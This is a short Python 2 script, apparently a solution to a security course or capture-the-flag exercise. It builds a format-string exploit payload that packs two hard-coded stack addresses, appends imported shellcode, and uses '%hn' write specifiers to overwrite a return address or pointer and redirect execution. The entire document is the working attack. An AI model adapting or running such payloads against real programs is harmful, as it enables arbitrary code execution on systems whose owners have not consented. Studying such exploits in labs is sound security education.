from shellcode import shellcode
from struct import pack
l = 0xbffef23c
h = 0xbffef23e
buf = 0xbffeea34
payload = pack("<I", l) + pack("<I", h) + shellcode + '%49119x%5$hn%10810x%4$hn'
print payload
